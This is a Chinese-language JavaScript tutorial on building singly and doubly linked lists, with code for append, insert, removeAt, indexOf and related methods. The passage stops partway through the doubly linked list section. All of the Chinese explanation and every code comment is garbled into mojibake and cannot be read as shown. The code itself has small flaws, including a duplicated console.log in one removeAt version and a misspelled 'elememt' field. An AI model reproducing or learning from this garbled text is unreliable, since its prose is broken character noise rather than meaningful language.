ï¼Œæ•°ç»„ï¼ˆæˆ–åˆ—è¡¨ï¼‰å¯èƒ½æ˜¯æœ€å¸¸è§çš„æ•°æ®ç»“æž„äº†ã€‚ç„¶åŽè¿™ç§æ•°æ®ç»“æž„æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼šæ•°ç»„çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œä»Žæ•°ç»„çš„èµ·ç‚¹æˆ–ä¸­é—´æ’å…¥æˆ–ç§»é™¤é¡¹çš„æˆæœ¬æœ‰ç‚¹é«˜ï¼Œå› ä¸ºéœ€è¦ç§»åŠ¨å…ƒç´ ã€‚ é“¾è¡¨å­˜å‚¨æœ‰åºçš„å…ƒç´ é›†åˆï¼Œä½†ä¸åŒäºŽæ•°ç»„ï¼Œé“¾è¡¨ä¸­çš„å…ƒç´ åœ¨å†…å­˜å¹¶ä¸æ˜¯è¿žç»­æ”¾ç½®çš„ã€‚æ¯ä¸ªå…ƒç´ ç”±ä¸€ä¸ªå­˜å‚¨å…ƒç´ æœ¬èº«çš„èŠ‚ç‚¹å’Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼ˆä¹Ÿç§°æŒ‡é’ˆæˆ–é“¾æŽ¥ï¼‰ç»„æˆï¼Œä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªé“¾è¡¨çš„ç»“æž„ã€‚ ç›¸å¯¹äºŽä¼ ç»Ÿçš„æ•°ç»„ï¼Œé“¾è¡¨çš„ä¸€ä¸ªå¥½å¤„åœ¨äºŽï¼Œæ·»åŠ æˆ–è€…ç§»é™¤å…ƒç´ çš„æ—¶å€™ä¸éœ€è¦ç§»åŠ¨å…¶ä»–å…ƒç´ ï¼Œç„¶åŽï¼Œé“¾è¡¨éœ€è¦ä½¿ç”¨æŒ‡é’ˆï¼Œå› ä¸ºå®žçŽ°é“¾è¡¨æ—¶éœ€è¦é¢å¤–æ³¨æ„ã€‚æ•°ç»„çš„å¦ä¸€ä¸ªç»†èŠ‚æ˜¯å¯ä»¥ç›´æŽ¥è®¿é—®ä»»ä½•ä½ç½®çš„ä»»ä½•å…ƒç´ ï¼Œè€Œæƒ³è¦è®¿é—®é“¾è¡¨ä¸­é—´çš„ä¸€ä¸ªå…ƒç´ ï¼Œéœ€è¦ä»Žèµ·ç‚¹ï¼ˆè¡¨å¤´ï¼‰å¼€å§‹è¿­ä»£åˆ—è¡¨ç›´åˆ°æ‰¾åˆ°æ‰€éœ€çš„å…ƒç´ ã€‚ çŽ°å®žä¸­ä¹Ÿæœ‰ä¸€äº›é“¾è¡¨çš„ä¾‹å­ï¼Œç¬¬ä¸€ä¸ªä¾‹å­å°±æ˜¯åº·åŠ èˆžé˜Ÿï¼Œæ¯ä¸ªäººå°±æ˜¯ä¸€ä¸ªå…ƒç´ ï¼Œæ‰‹å°±æ˜¯é“¾å‘ä¸‹ä¸€ä¸ªäººçš„æŒ‡é’ˆï¼Œå¯ä»¥å‘é˜Ÿåˆ—æ±‡æ€»å¢žåŠ äººâ€”â€”åªéœ€è¦æ‰¾åˆ°æƒ³åŠ å…¥çš„ç‚¹ï¼Œæ–­å¼€è¿žæŽ¥ï¼Œæ’å…¥ä¸€ä¸ªäººï¼Œå†é‡æ–°è¿žæŽ¥èµ·æ¥ã€‚ å¦å¤–ä¸€ä¸ªä¾‹å­å°±æ˜¯å¯»å®æ¸¸æˆï¼Œä½ æœ‰ä¸€æ¡çº¿ç´¢ï¼Œè¿™æ¡çº¿ç´¢æ˜¯æŒ‡å‘å¯»æ‰¾ä¸‹ä¸€ä¸ªçº¿ç´¢çš„åœ°ç‚¹çš„æŒ‡é’ˆï¼Œä½ é¡ºç€è¿™æ¡é“¾åŽ»ä¸‹ä¸€ä¸ªåœ°ç‚¹ï¼Œå¾—åˆ°å¦ä¸€æ¡æŒ‡å‘å†ä¸‹ä¸€å¤„çš„çº¿ç´¢ã€‚å¾—åˆ°åˆ—è¡¨ä¸­é—´çš„çº¿ç´¢çš„å”¯ä¸€æ–¹æ³•ï¼Œå°±æ˜¯ä»Žèµ·ç‚¹ï¼ˆç¬¬ä¸€ä¸ªçº¿ç´¢ï¼‰é¡ºç€åˆ—è¡¨å¯»æ‰¾ã€‚ è¿˜æœ‰ä¸€ä¸ªå¯èƒ½å°±æ˜¯ç”¨æ¥è¯´æ˜Žé“¾è¡¨ä¸­çš„æœ€æµè¡Œçš„ä¾‹å­ï¼Œé‚£å°±æ˜¯ç«è½¦ã€‚ä¸€åˆ—ç«è½¦æ˜¯ç”±ä¸€ç³»åˆ—è½¦åŽ¢ï¼ˆä¹Ÿç§°è½¦çš®ï¼‰ç»„æˆçš„ã€‚æ¯èŠ‚è½¦åŽ¢æˆ–è½¦çš®éƒ½äº’ç›¸è¿žæŽ¥ã€‚å¯ä»¥å¾ˆå®¹æ˜“çš„åˆ†ç¦»å¼€ä¸€èŠ‚è½¦çš®ï¼Œæ”¹å˜å®ƒçš„ä½ç½®ï¼Œæ·»åŠ æˆ–ç§»é™¤å®ƒã€‚ åˆ›å»ºé“¾è¡¨äº†è§£é“¾è¡¨æ˜¯ä»€ä¹ˆä¹‹åŽï¼Œå°±è¦å¼€å§‹å®žçŽ°æˆ‘ä»¬çš„æ•°æ®ç»“æž„äº†ï¼Œä¸€ä¸‹æ˜¯æˆ‘ä»¬çš„ LinkedList ç±»çš„éª¨æž¶ï¼š 123456789101112131415161718192021function LinkedList()&#123; let Node = function(element)&#123; // éœ€è¦ä¸€ä¸ªNodeè¾…åŠ©ç±»ï¼Œè¡¨ç¤ºè¦åŠ å…¥åˆ—è¡¨çš„é¡¹ï¼Œelement ä»£è¡¨è¦æ·»åŠ åˆ°åˆ—è¡¨ä¸­çš„å€¼ï¼Œ next dä»£è¡¨æŒ‡å‘åˆ—è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å‘çš„æŒ‡é’ˆ this.element = element; this.next = null; &#125; let length = 0; // å­˜å‚¨åˆ—è¡¨é¡¹çš„æ•°é‡ length å±žæ€§ let head = null; // å­˜å‚¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„å¼•ç”¨åœ¨ head å˜é‡ this.append = function(element)&#123;&#125;; this.insert = function(position,element)&#123;&#125; this.removeAt = function(position)&#123;&#125; this.remove = function(element)&#123;&#125; this.indexOf = function(position)&#123;&#125; this.isEmpty = function()&#123;&#125; this.size = function()&#123;&#125; this.getHead = function()&#123;&#125; this.toString = function()&#123;&#125; this.print = function()&#123;&#125;&#125; LinkedList ç±»çš„æ–¹æ³•çš„åŠŸèƒ½ append(element)ï¼šå‘åˆ—è¡¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ªæ–°çš„é¡¹ insert(position,element)ï¼šå‘åˆ—è¡¨çš„ç‰¹å®šä½ç½®æ’å…¥ä¸€ä¸ªæ–°çš„é¡¹ removeAt(position)ï¼šä»Žåˆ—è¡¨çš„ç‰¹å®šä½ç½®ç§»é™¤ä¸€é¡¹ remove(element)ï¼šä»Žåˆ—è¡¨ä¸­ç§»é™¤ä¸€é¡¹ indexOf(element)ï¼šè¿”å›žå…ƒç´ åœ¨åˆ—è¡¨ä¸­çš„ç´¢å¼•ã€‚å¦‚æžœåˆ—è¡¨ä¸­æ²¡æœ‰è¯¥å…ƒç´ åˆ™è¿”å›ž-1 isEmpty()ï¼šå¦‚æžœé“¾è¡¨ä¸­ä¸åŒ…å«ä»»ä½•å…ƒç´ ï¼Œè¿”å›žtrue,å¦‚æžœé“¾è¡¨çš„é•¿åº¦å¤§äºŽ0åˆ™è¿”å›ž false size()ï¼šè¿”å›žé“¾è¡¨åŒ…å«çš„å…ƒç´ ä¸ªæ•°ï¼Œä¸Žæ•°å­—çš„ length å±žæ€§ç±»ä¼¼ toString()ï¼šç”±äºŽåˆ—è¡¨é¡¹ä½¿ç”¨ Node ç±»ï¼Œå°±éœ€è¦é‡å†™ç»§æ‰¿è‡ª JavaScript å¯¹è±¡é»˜è®¤çš„ toString æ–¹æ³•ï¼Œè®©å…¶åªè¾“å‡ºå…ƒç´ çš„å€¼ã€‚ å‘é“¾è¡¨å°¾éƒ¨è¿½åŠ å…ƒç´ å‘ LinkedList å¯¹è±¡å°¾éƒ¨æ·»åŠ ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå¯èƒ½æœ‰ä¸¤ç§åœºæ™¯ï¼Œåˆ—è¡¨ä¸ºç©ºï¼Œæ·»åŠ çš„æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæˆ–è€…åˆ—è¡¨ä¸ä¸ºç©ºï¼Œå‘è¿½åŠ å…ƒç´ ã€‚ 123456789101112131415this.append = function(element)&#123; let node = new Node(element),current; if(head === null)&#123; head = node; &#125;else&#123; current = head; // å¾ªçŽ¯åˆ—è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°æœ€åŽä¸€é¡¹ while(current.next)&#123; current = current.next; &#125; // å½“current.nextå…ƒç´ ä¸ºnullæ—¶ï¼Œæ‰¾åˆ°æœ€åŽä¸€é¡¹ï¼Œå°†å…¶ next èµ‹ä¸º node,å»ºç«‹è¿žæŽ¥ current.next = node; &#125; length++; // æ›´æ–°åˆ—è¡¨çš„é•¿åº¦&#125;; å¯ä»¥åœ¨ append å‡½æ•° åŠ ä¸Šreturn node ,é€šè¿‡ä¸‹é¢çš„ä»£ç æ¥ä½¿ç”¨å’Œæµ‹è¯•ç›®å‰åˆ›å»ºçš„æ•°æ®ç»“æž„ 123let list = new LinkedList();console.log(list.append(15)); // Node &#123;element: 15, next: null&#125;console.log(list.append(10)); // Node &#123;element: 10, next: null&#125; ä»Žé“¾è¡¨ä¸­ç§»é™¤å…ƒç´ ç§»é™¤å…ƒç´ ä¹Ÿæœ‰ä¸¤ç§åœºæ™¯ï¼šç¬¬ä¸€ç§æ˜¯ç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œç¬¬äºŒç§æ˜¯ç§»é™¤ç¬¬ä¸€ä¸ªä»¥å¤–çš„ä»»ä¸€å…ƒç´ ã€‚æˆ‘ä»¬è¦å®žçŽ°ä¸¤ç§ remove æ–¹æ³•ï¼šç¬¬ä¸€ç§æ˜¯ä»Žç‰¹å®šä½ç½®ç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œç¬¬äºŒç§æ˜¯æ ¹æ®å…ƒç´ çš„å€¼ç§»é™¤å…ƒç´ ã€‚ é¦–å…ˆå…ˆå®žçŽ°ç§»é™¤ç‰¹å®šä½ç½®çš„å…ƒç´  123456789101112131415161718192021222324this.removeAt = function(position)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt;-1 &amp;&amp; position &lt; length)&#123; let current = head,previous,index = 0; // ç§»é™¤ç¬¬ä¸€é¡¹ if(position === 0)&#123; head = current.next; console.log(current.element); &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; // å°† previous ä¸Ž current çš„ä¸‹ä¸€é¡¹è¿žæŽ¥èµ·æ¥ï¼Œè·³è¿‡ current,ä»Žç§»é™¤å®ƒ previous.next = current.next; &#125; length --; console.log(current.element); return current.element; &#125;else&#123; return null; &#125; &#125; å¦‚æžœæƒ³è¦ç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆposition=0ï¼‰ï¼Œè¦åšçš„å°±æ˜¯è®© head æŒ‡å‘åˆ—è¡¨çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬ç”¨ current å˜é‡ç©¿ç”²ä¸€ä¸ªå¯¹åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„åº”ç”¨ï¼Œè¿™æ · current å˜é‡å°±æ˜¯å¯¹åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼Œå¦‚æžœå§ head èµ‹å€¼ä¸º current.next å°±ä¼šç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ å¦‚æžœæˆ‘ä»¬è¦ç§»é™¤åˆ—è¡¨çš„æœ€åŽä¸€é¡¹æˆ–è€…æ˜¯ä¸­é—´çš„ä¸€é¡¹ï¼Œä¸ºæ­¤ï¼Œéœ€è¦ä¾é ä¸€ä¸ªç»†èŠ‚æ¥è¿­ä»£åˆ—è¡¨ï¼ŒçŸ¥é“åˆ°è¾¾ç›®æ ‡ä½ç½®ï¼ˆindex++ &lt; positionï¼‰ï¼Œä½¿ç”¨ä¸€ä¸ªç”¨äºŽå†…éƒ¨æŽ§åˆ¶å’Œé€’å¢žçš„ index å˜é‡ï¼Œcurrent å˜é‡æ€»æ˜¯å¯¹æ‰€å¾ªçŽ¯åˆ—è¡¨çš„å½“å‰å…ƒç´ çš„å¼•ç”¨ï¼ˆcurrent = current.nextï¼‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå¯¹å½“å‰å…ƒç´ çš„å‰ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼ˆprevious = currentï¼‰ï¼Œå®ƒè¢«å‘½åä¸º previousã€‚ å› æ­¤ï¼Œè¦ä»Žåˆ—è¡¨ä¸­ç§»é™¤å½“å‰å…ƒç´ ï¼Œè¦åšçš„å°±æ˜¯å°† previous.next å’Œ current.next é“¾æŽ¥èµ·æ¥ï¼Œè¿™æ ·å½“å‰å…ƒç´ å°±ä¼šè¢«ä¸¢å¼ƒåœ¨è®¡ç®—æœºå†…å­˜ä¸­ï¼Œç­‰ç€è¢«åžƒåœ¾å›žæ”¶ç«™æ¸…é™¤ã€‚ å¯¹äºŽæœ€åŽä¸€ä¸ªå…ƒç´ ï¼Œåœ¨ï¼ˆwhile(index++ &lt; position)ï¼‰è·³å‡ºå¾ªçŽ¯æ—¶ï¼Œ current å˜é‡æ€»æ˜¯å¯¹åˆ—è¡¨ä¸­æœ€åŽä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼ˆè¦ç§»é™¤çš„å…ƒç´ ï¼‰ã€‚current.next çš„å€¼å°†æ˜¯ nullï¼ˆå› ä¸ºå®ƒæ˜¯æœ€åŽä¸€ä¸ªå…ƒç´ ï¼‰ã€‚ç”±äºŽè¿˜ä¿ç•™äº†å¯¹ previous çš„å¼•ç”¨ï¼ˆå½“å‰å…ƒç´ çš„å‰ä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œprevious å°±æŒ‡å‘äº† current ã€‚é‚£ä¹ˆè¦ç§»é™¤ current,è¦åšçš„å°±æ˜¯æŠŠ previous.next çš„å€¼æ”¹å˜ä¸º current.next ã€‚ åœ¨ä»»æ„ä½ç½®æ’å…¥å…ƒç´ å®žçŽ° insert æ–¹æ³•ï¼Œä½¿ç”¨è¿™ä¸ªæ–¹æ³•å¯ä»¥åœ¨ä»»æ„ä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ ã€‚ 123456789101112131415161718192021222324this.insert = function(position,element)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt;=0 &amp;&amp; position &lt;= length)&#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0 )&#123; // åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ·»åŠ  node.next = current; head = node; &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125;else&#123; return false; &#125;&#125; current å˜é‡æ˜¯å¯¹åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯æŠŠ node.next çš„å€¼è®¾ä¸º current ï¼ˆåˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼‰ï¼ŒçŽ°åœ¨ head å’Œ node.next éƒ½æŒ‡å‘äº† current ï¼ŒæŽ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æŠŠ head çš„å¼•ç”¨æ”¹ä¸º node ï¼Œè¿™æ ·åˆ—è¡¨ä¸­å°±æœ‰äº†ä¸€ä¸ªæ–°å…ƒç´ ã€‚ çŽ°åœ¨æ¥å¤„ç†ç¬¬äºŒç§åœºæ™¯ï¼Œåœ¨åˆ—è¡¨ä¸­é—´æˆ–è€…æœ«å°¾æ·»åŠ ä¸€ä¸ªæ–°çš„å…ƒç´ ã€‚é¦–å…ˆï¼Œå¾ªçŽ¯è®¿é—®åˆ—è¡¨ï¼Œæ‰¾æ‰“ç›®æ ‡ä¸ºä½ç½®ï¼Œå½“è·³å‡ºå¾ªçŽ¯çš„æ—¶å€™ï¼Œ current å˜é‡å°†æ˜¯å¯¹æƒ³è¦æ’å…¥æ–°å…ƒç´ çš„ä½ç½®ä¹‹åŽä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼Œè€Œ previous å°†æ˜¯å¯¹æƒ³è¦æ’å…¥æ–°å…ƒç´ çš„ä½ç½®ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘é—¨è¦åœ¨ previous å’Œ current ä¹‹é—´æ·»åŠ æ–°é¡¹ã€‚å› æ­¤ï¼Œéœ€è¦å°†æ–°é¡¹ï¼ˆnodeï¼‰å’Œå½“å‰é“¾æŽ¥èµ·æ¥ï¼ˆnode.next = currentï¼‰ï¼Œç„¶åŽéœ€è¦æ”¹å˜ previous å’Œ current zä¹‹é—´çš„é“¾æŽ¥ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®© previous.next æŒ‡å‘ nodeã€‚ å®žçŽ°å…¶ä»–æ–¹æ³•toStringæ–¹æ³• 123456789this.toString = function()&#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '-':''); current = current.next; &#125; return string;&#125; èµ‹å€¼currentä¸º head, å¾ªçŽ¯è®¿é—® currentï¼Œå°† current å˜é‡å½“åšç´¢å¼•ï¼Œåˆå§‹åŒ–ç”¨äºŽæ‹¼æŽ¥å…ƒç´ çš„å˜é‡ï¼ˆstringï¼‰ã€‚é€šè¿‡ current æ¥æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æžœåˆ—è¡¨ä¸ºç©ºæˆ–æ˜¯åˆ°è¾¾åˆ—è¡¨ä¸­æœ€åŽä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä½ï¼ˆnullï¼‰ï¼Œwhile å¾ªçŽ¯ä¸­çš„ä»£ç å°±ä¸ä¼šæ‰§è¡Œï¼Œå°±å¯ä»¥å¾—åˆ°å…ƒç´ çš„å†…å®¹ï¼Œå°†å…¶æ‹¼æŽ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œæœ€åŽï¼Œè¿­ä»£ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚æœ€åŽï¼Œè¿”å›žåˆ—è¡¨å†…å®¹çš„å­—ç¬¦ä¸²ã€‚ indexOfæ–¹æ³• indexOfæ–¹æ³•æŽ¥å—ä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œå¦‚æžœåœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°å®ƒï¼Œå°±è¿”å›žå…ƒç´ çš„ä½ç½®ï¼Œå¦åˆ™è¿”å›ž -1 123456789101112this.indexOf = function(element)&#123; let current = head, index = 0; while(current)&#123; if(element === current.element)&#123; return index; &#125; index++; current = current.next; &#125; return -1;&#125; å¾ªçŽ¯å˜é‡ currentï¼Œå®ƒçš„åˆå§‹å€¼æ˜¯ head ,åˆ©ç”¨index æ¥è®¡ç®—ä½ç½®æ•°ã€‚è®¿é—®å…ƒç´ ï¼Œæ£€æŸ¥å½“å‰å…ƒç´ æ˜¯å¦æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ï¼Œå¦‚æžœæ˜¯ï¼Œå°±è¿”å›žå®ƒçš„ä½ç½®ï¼Œä¸æ˜¯å°±ç»§ç»­è®¡æ•°ï¼Œæ£€æŸ¥åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚ å¦‚æžœåˆ—è¡¨ä¸ºç©ºï¼Œæˆ–æ˜¯åˆ°è¾¾åˆ—è¡¨çš„å°¾éƒ¨ï¼ˆcurrent = current.next å°†æ˜¯ nullï¼‰ï¼Œå¾ªçŽ¯å°±ä¸ä¼šæ‰§è¡Œã€‚å¦‚æžœæ²¡æœ‰æ‰¾åˆ°å€¼å°±è¿”å›ž -1 ã€‚ å®žçŽ°äº†ä¸Šé¢çš„æ–¹æ³•ï¼Œå°±å¯ä»¥å®žçŽ°removeç­‰å…¶ä»–æ–¹æ³•äº† removeæ–¹æ³• 1234this.remove = function(element)&#123; let index = this.indexOf(element); return this.removeAt(index);&#125; isEmptyã€size å’Œ getHeadæ–¹æ³• isEmptyå’Œsize å’Œä¹‹å‰ç« èŠ‚å®žçŽ°ä¸€æ¨¡ä¸€æ · 1234567this.isEmpty = function()&#123; return length === 0;&#125;this.size = function()&#123; return length;&#125; è¿˜æœ‰ getHeadæ–¹æ³• 123this.getHead = function()&#123; return head;&#125; head å˜é‡æ˜¯ LinkedList ç±»çš„ç§æœ‰å˜é‡ï¼Œæˆ‘ä»¬å¦‚æžœéœ€è¦åœ¨ç±»çš„å®žçŽ°å¤–éƒ¨å¾ªçŽ¯è®¿é—®åˆ—è¡¨ï¼Œå°±éœ€è¦æä¾›ä¸€ç§èŽ·å–ç±»çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ–¹æ³•ã€‚ æ•´ä¸ª LinkedListå‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115function LinkedList()&#123; let Node = function(element)&#123; // éœ€è¦ä¸€ä¸ªNodeè¾…åŠ©ç±»ï¼Œè¡¨ç¤ºè¦åŠ å…¥åˆ—è¡¨çš„é¡¹ï¼Œelement ä»£è¡¨è¦æ·»åŠ åˆ°åˆ—è¡¨ä¸­çš„å€¼ï¼Œ next dä»£è¡¨æŒ‡å‘åˆ—è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å‘çš„æŒ‡é’ˆ this.element = element; this.next = null; &#125; let length = 0; // å­˜å‚¨åˆ—è¡¨é¡¹çš„æ•°é‡ length å±žæ€§ let head = null; // å­˜å‚¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„å¼•ç”¨åœ¨ head å˜é‡ this.append = function(element)&#123; let node = new Node(element),current; if(head === null)&#123; head = node; &#125;else&#123; current = head; // å¾ªçŽ¯åˆ—è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°æœ€åŽä¸€é¡¹ while(current.next)&#123; current = current.next; &#125; // å½“current.nextå…ƒç´ ä¸ºnullæ—¶ï¼Œæ‰¾åˆ°æœ€åŽä¸€é¡¹ï¼Œå°†å…¶ next èµ‹ä¸º node,å»ºç«‹è¿žæŽ¥ current.next = node; &#125; length++; // æ›´æ–°åˆ—è¡¨çš„é•¿åº¦ &#125;; this.insert = function(position,element)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt;=0 &amp;&amp; position &lt;= length)&#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0 )&#123; // åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ·»åŠ  node.next = current; head = node; &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125;else&#123; return false; &#125; &#125; this.removeAt = function(position)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt;-1 &amp;&amp; position &lt; length)&#123; let current = head,previous,index = 0; // ç§»é™¤ç¬¬ä¸€é¡¹ if(position === 0)&#123; head = current.next; console.log(current.element); &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; // å°† previous ä¸Ž current çš„ä¸‹ä¸€é¡¹è¿žæŽ¥èµ·æ¥ï¼Œè·³è¿‡ current,ä»Žç§»é™¤å®ƒ previous.next = current.next; &#125; length --; return current.element; &#125;else&#123; return null; &#125; &#125; this.remove = function(element)&#123; let index = this.indexOf(element); return this.removeAt(index); &#125; this.indexOf = function(element)&#123; let current = head, index = 0; while(current)&#123; if(element === current.element)&#123; return index; &#125; index++; current = current.next; &#125; return -1; &#125; this.isEmpty = function()&#123; return length === 0; &#125; this.size = function()&#123; return length; &#125; this.getHead = function()&#123; return head; &#125; this.toString = function()&#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '-':''); current = current.next; &#125; return string; &#125;&#125; åŒå‘é“¾è¡¨é“¾è¡¨æœ‰å¤šç§ä¸åŒçš„ç±»åž‹ï¼Œè¿™ä¸€èŠ‚ä»‹ç» åŒå‘é“¾è¡¨ï¼ŒåŒå‘é“¾è¡¨å’Œæ™®é€šé“¾è¡¨çš„åŒºåˆ«åœ¨äºŽï¼Œåœ¨é“¾è¡¨ä¸­ï¼Œä¸€ä¸ªèŠ‚ç‚¹åªæœ‰é“¾å‘ä¸‹ä¸€ä¸ªé“¾æŽ¥ï¼Œè€Œåœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œé“¾æŽ¥æ˜¯åŒå‘çš„ï¼šä¸€ä¸ªé“¾å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¦ä¸€ä¸ªé“¾å‘å‰ä¸€ä¸ªå…ƒç´ ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º å…ˆä»Žå®žçŽ° DoublyLinkedList ç±»æ‰€éœ€è¦çš„å˜åŠ¨å¼€å§‹ 123456789101112function DoublyLinkedList()&#123; let Node = function(elememt)&#123; this.elememt = elememt; this.next = null; this.prev = null; // æ–°å¢žçš„ &#125; let length = 0; let head = null; let tail = null // æ–°å¢žçš„ // è¿™é‡Œæ˜¯æ–¹æ³•&#125; å¯ä»¥çœ‹å‡ºï¼ŒNode ç±»ä¸­æ–°å¢žäº† prevå±žæ€§ï¼ˆä¸€ä¸ªæ–°æŒ‡é’ˆï¼‰ï¼Œåœ¨ DoublyLinkedList ç±»é‡Œä¹Ÿæœ‰ç”¨æ¥ä¿å­˜å¯¹åˆ—è¡¨æœ€åŽä¸€é¡¹çš„å¼•ç”¨çš„ tail å±žæ€§ã€‚ åŒå‘é“¾è¡¨æä¾›äº†ä¸¤ç§è¿­ä»£åˆ—è¡¨çš„æ–¹å¼ï¼šä»Žå¤´åˆ°å°¾ï¼Œæˆ–è€…ä»Žå°¾åˆ°å¤´ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æ–¹ä½ä¸€ä¸ªç‰¹å®šèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªæˆ–è€…æ˜¯ä¸Šä¸€ä¸ªå…ƒç´ ã€‚åœ¨å•å‘é“¾è¡¨ä¸­ï¼Œå¦‚æžœè¿­ä»£åˆ—è¡¨æ—¶é”™è¿‡äº†è¦æ‰¾çš„å…ƒç´ ï¼Œå°±éœ€è¦å›žåˆ°åˆ—è¡¨èµ·ç‚¹ï¼Œé‡æ–°è¿­ä»£ã€‚è¿™æ˜¯åŒå‘é“¾è¡¨çš„ä¸€ä¸ªä¼˜ç‚¹ã€‚ åœ¨ä»»æ„ä½ç½®æ’å…¥æ–°å…ƒç´ å‘åŒå‘é“¾è¡¨ä¸­æ’å…¥ä¸€ä¸ªæ–°é¡¹è·Ÿï¼ˆå•å‘ï¼‰é“¾è¡¨éžå¸¸ç›¸ç±»ä¼¼ã€‚åŒºåˆ«åœ¨äºŽï¼Œé“¾è¡¨åªè¦æŽ§åˆ¶ä¸€ä¸ª next æŒ‡é’ˆï¼Œè€ŒåŒå‘é“¾è¡¨åˆ™è¦åŒæ—¶æŽ§åˆ¶ next å’Œ prev ï¼ˆpreviousï¼Œå‰ä¸€ä¸ªï¼‰è¿™ä¸¤ä¸ªæŒ‡é’ˆã€‚ 1234567891011121314151617181920212223242526272829303132333435363738this.insert = function(position,elememt)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt;= 0 &amp;&amp; position &lt;= length)&#123; let node = new Node(elememt), current = head, previous, index = 0; if(position === 0)&#123; // åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ·»åŠ  if(!head)&#123; head = node; tail = node; &#125;else&#123; node.next = current; current.prev = node; head = node; &#125; &#125;else if(position === length)&#123; // æœ€åŽä¸€é¡¹ current = tail; current.next = node; node.prev = current; tail = node; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; current.prev = node; node.prev = previous; &#125; length++ return true; &#125;else&#123; return false; &#125;&#125; åœ¨åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼ˆåˆ—è¡¨çš„èµ·ç‚¹ï¼‰æ’å…¥ä¸€ä¸ªæ–°å…ƒç´ ï¼Œå¦‚æžœåˆ—è¡¨ä¸ºç©ºï¼ˆif(!head)ï¼‰ï¼Œé‚£åªéœ€å°† head å’Œ tail éƒ½æŒ‡å‘è¿™ä¸ªæ–°èŠ‚ç‚¹ã€‚å¦‚æžœä¸ä¸ºç©ºï¼Œ current å˜é‡å°†æ˜¯å¯¹åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚å°±åƒæˆ‘ä»¬åœ¨é“¾è¡¨ä¸­æ‰€åšçš„ï¼ŒæŠŠ node.next è®¾ä¸º current ï¼Œè€Œhead å°†æŒ‡é’ˆæŒ‡å‘ node 